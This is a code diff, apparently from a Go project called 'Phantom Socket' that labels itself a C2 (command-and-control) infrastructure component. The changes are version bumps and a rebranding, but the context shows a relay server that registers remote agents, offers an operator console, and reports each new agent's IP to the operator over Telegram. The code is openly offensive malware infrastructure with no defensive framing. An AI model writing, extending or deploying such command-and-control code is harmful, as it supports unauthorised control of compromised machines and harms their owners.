@@ -1,6 +1,6 @@
-// Project: Phantom Socket v1.0.0-stable
+// Project: Phantom Socket v1.0.1-stable
 // Module: C2 Component
-// Description: C2 Infrastructure component.
+// Description: C2 Infrastructure component (Gacor Edition).
 
 package main
 
@@ -172,7 +172,7 @@ func main() {
 	listenAddr := flag.String("listen", "", "Listen address (e.g., :42291). Overrides RELAY_LISTEN_ADDR env var")
 	flag.Parse()
 
-	logger.Println("Phantom Socket v1.0.0-stable Relay Server Starting...")
+	logger.Println("Phantom Socket v1.0.1-stable Relay Server Starting...")
 	logger.Println("Building with Go 1.22+ for high-performance concurrency")
 
 	cfg := config.LoadFromEnv()
@@ -332,7 +332,7 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 	logger.Printf("[SUCCESS] Peer %s authenticated and registered from %s", peerID, remoteAddr)
 
 	telegram.SendAlert(telegram.AlertData{
-		Type:          "AGENT_ONLINE",
+		Type:          "v1.0.1-stable ONLINE",
 		Hostname:      "N/A",
 		User:          "N/A",
 		IP:            remoteAddr,
@@ -392,7 +392,7 @@ func printPeerList(registry *peer.Registry) {
 
 func startInteractiveConsole(registry *peer.Registry, cfg *config.Config) {
 	consoleMode = true
-	fmt.Println("Phantom Socket v1.0.0-stable Relay Console")
+	fmt.Println("Phantom Socket v1.0.1-stable Relay Console")
 	fmt.Println("Type 'help' for available commands.")
 	fmt.Println()
 
